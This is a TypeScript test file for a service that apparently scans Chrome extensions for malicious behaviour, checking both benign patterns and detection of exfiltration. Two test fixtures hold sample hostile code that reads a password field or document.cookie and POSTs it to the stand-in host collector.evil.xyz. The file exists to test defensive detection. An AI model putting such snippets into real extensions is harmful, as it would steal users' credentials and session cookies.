import { Test, TestingModule } from '@nestjs/testing';
import { StaticAnalysisService } from '../static-analysis.service.js';
import { AstParserService } from '../ast-parser/ast-parser.service.js';
import { DomainClassifierService } from '../domain-classifier.service.js';
import { StructuredLogger } from '../../common/logger/logger.service.js';
import type {
  FileRole,
  PreprocessorOutput,
  ProcessedFile,
} from '../../common/interfaces/analysis.interfaces.js';

const buildFile = (
  path: string,
  role: FileRole,
  cleanCode: string,
): ProcessedFile => ({
  path,
  role,
  isObfuscated: false,
  isMinified: false,
  originalLineCount: cleanCode.split('\n').length,
  cleanCode,
  urls: [],
  extractedUrls: [],
  domains: [],
  chromeApis:
    cleanCode.match(/\bchrome\.[a-zA-Z.]+/g)?.map((api, index) => ({
      api,
      line: index + 1,
    })) ?? [],
  usesFetch: /\bfetch\s*\(/.test(cleanCode),
  usesXHR: /\bnew\s+XMLHttpRequest\b/.test(cleanCode),
  usesEval: /\beval\s*\(/.test(cleanCode),
  usesDomManipulation: /\.(innerHTML|outerHTML|innerText|textContent)\s*=/.test(
    cleanCode,
  ),
});

const buildPreprocessed = (
  files: ProcessedFile[],
  manifestOverrides: Partial<PreprocessorOutput['manifest']> = {},
): PreprocessorOutput => ({
  crxHash: 'hash',
  extractPath: process.cwd(),
  manifest: {
    manifestVersion: 3,
    name: 'Test Extension',
    version: '1.0.0',
    apiPermissions: [],
    hostPermissions: [],
    optionalPermissions: [],
    contentScripts: [],
    backgroundScripts: [],
    sandboxPages: [],
    chromeUrlOverrides: {},
    webAccessibleResources: [],
    declarativeNetRequestRules: [],
    permissionRisk: [],
    rawManifest: { manifest_version: 3, name: 'Test Extension' },
    ...manifestOverrides,
  },
  files,
  resources: files.map((f) => ({
    path: f.path,
    type: 'javascript',
    sizeBytes: f.cleanCode?.length ?? 0,
    isMinified: false,
    lineCount: f.originalLineCount ?? 0,
  })),
  nestedArchives: [],
  dependencyGraph: {
    entries: files.map((f) => f.path),
    edges: [],
    reachable: files.map((f) => f.path),
    orphanScripts: [],
    unresolved: [],
  },
  obfuscatedFileCount: 0,
  hasObfuscation: false,
  remoteCodeViolations: [],
  resultado1: [],
  resultado2_priority: [],
  resultado2_unknown: [],
});

describe('StaticAnalysisService', () => {
  let service: StaticAnalysisService;

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        StaticAnalysisService,
        AstParserService,
        DomainClassifierService,
        StructuredLogger,
      ],
    }).compile();

    service = module.get<StaticAnalysisService>(StaticAnalysisService);
  });

  it('does not treat an Instagram author link in popup as a contacted domain', async () => {
    const preprocessed = buildPreprocessed([
      buildFile(
        'popup.js',
        'popup',
        `
          document.getElementById("ig").addEventListener("click", () => {
            window.open("https://www.instagram.com/team/", "_blank");
          });
        `,
      ),
    ]);

    await service.analyze(preprocessed, 'job');

    expect(preprocessed.resultado2_priority).toEqual([]);
    expect(preprocessed.resultado2_unknown).toEqual([]);
  });

  it('classifies Google Cloud Functions backends as technical infrastructure', async () => {
    const preprocessed = buildPreprocessed([
      buildFile(
        'popup.js',
        'popup',
        `
          fetch("https://us-central1-office-pets.cloudfunctions.net/getPets");
          fetch("https://us-central1-office-pets.cloudfunctions.net/getCoins");
        `,
      ),
    ]);

    await service.analyze(preprocessed, 'job');

    expect(preprocessed.resultado2_priority).toEqual([]);
    expect(preprocessed.resultado2_unknown).toEqual([]);
  });

  it('does not correlate background-to-tab values as credential theft', async () => {
    const preprocessed = buildPreprocessed(
      [
        buildFile(
          'background.js',
          'background',
          `
            chrome.runtime.onMessage.addListener((msg) => {
              chrome.tabs.sendMessage(1, { value: msg.value });
              fetch("https://api.example.com/sync", { method: "POST" });
            });
          `,
        ),
      ],
      {
        backgroundScripts: ['background.js'],
      },
    );

    await service.analyze(preprocessed, 'job');

    expect(
      preprocessed.resultado1.some((f) =>
        /credential theft|inter-file exfiltration/.test(f.detail),
      ),
    ).toBe(false);
  });

  it('still runs semantic analysis on files marked as obfuscated', async () => {
    const file = buildFile(
      'content.js',
      'content_script',
      `
        const password = document.querySelector('input[type="password"]').value;
        fetch("https://collector.evil.xyz/collect", { method: "POST", body: password });
      `,
    );
    file.isObfuscated = true;
    const preprocessed = buildPreprocessed([file], {
      contentScripts: [{ matches: ['<all_urls>'], js: ['content.js'] }],
    });

    await service.analyze(preprocessed, 'job');

    expect(
      preprocessed.resultado1.some(
        (f) => f.discoveryType === 'codigo_ofuscado',
      ),
    ).toBe(true);
    expect(
      preprocessed.resultado1.some(
        (f) => f.discoveryType === 'flujo_datos_a_red',
      ),
    ).toBe(true);
  });

  it('correlates sensitive content-script messages with background network sinks', async () => {
    const preprocessed = buildPreprocessed(
      [
        buildFile(
          'content.js',
          'content_script',
          `
            const token = document.cookie;
            chrome.runtime.sendMessage({ token });
          `,
        ),
        buildFile(
          'background.js',
          'background',
          `
            chrome.runtime.onMessage.addListener((msg) => {
              fetch("https://collector.evil.xyz/collect", {
                method: "POST",
                body: JSON.stringify(msg)
              });
            });
          `,
        ),
      ],
      {
        apiPermissions: ['cookies'],
        hostPermissions: ['<all_urls>'],
        contentScripts: [{ matches: ['<all_urls>'], js: ['content.js'] }],
        backgroundScripts: ['background.js'],
        permissionRisk: [
          {
            permission: 'cookies',
            category: 'high',
            weight: 5,
            hostSensitive: true,
            source: 'permissions',
          },
          {
            permission: '<all_urls>',
            category: 'critical',
            weight: 10,
            hostSensitive: true,
            source: 'host_permissions',
          },
        ],
      },
    );

    await service.analyze(preprocessed, 'job');

    expect(
      preprocessed.resultado1.some((f) =>
        f.detail.includes('likely inter-file exfiltration path'),
      ),
    ).toBe(true);
    expect(preprocessed.resultado2_unknown.map((d) => d.domain)).toContain(
      'collector.evil.xyz',
    );
  });
});
